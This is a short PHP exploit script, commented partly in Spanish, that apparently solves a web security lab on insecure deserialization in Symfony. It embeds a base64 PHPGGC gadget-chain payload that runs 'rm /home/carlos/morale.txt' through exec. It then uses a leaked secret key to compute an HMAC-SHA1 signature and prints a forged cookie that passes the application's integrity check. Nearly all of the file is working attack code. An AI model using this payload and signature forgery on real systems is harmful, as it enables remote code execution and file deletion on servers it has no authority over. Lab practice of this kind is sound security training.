<?php
/**
 * Lab: PHP deserialization with a pre-built gadget chain
 * Target: Symfony Framework
 * Vulnerability: Insecure Deserialization + Weak Secret Key
 * Goal: Remote Code Execution (RCE) - Delete file /home/carlos/morale.txt
 */

// 1. Objeto serializado generado con PHPGGC (Symfony/TagAwareAdapter)
// Este payload está diseñado para invocar 'exec' y borrar el archivo objetivo.
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";

// 2. Clave secreta obtenida (Leak/Brute Force)
$secretKey = "o2ioz9tnt51e0mvw6w5636h6m6thyuti";

// 3. Generación de la firma HMAC SHA-1 para evadir la validación de integridad
$signature = hash_hmac('sha1', $object, $secretKey);

// 4. Construcción de la cookie maliciosa
$data = array(
    "token" => $object,
    "sig_hmac_sha1" => $signature
);

$cookie = urlencode(json_encode($data));

// Resultado para inyectar en el navegador
echo "Cookie generada: \n" . $cookie;
?>
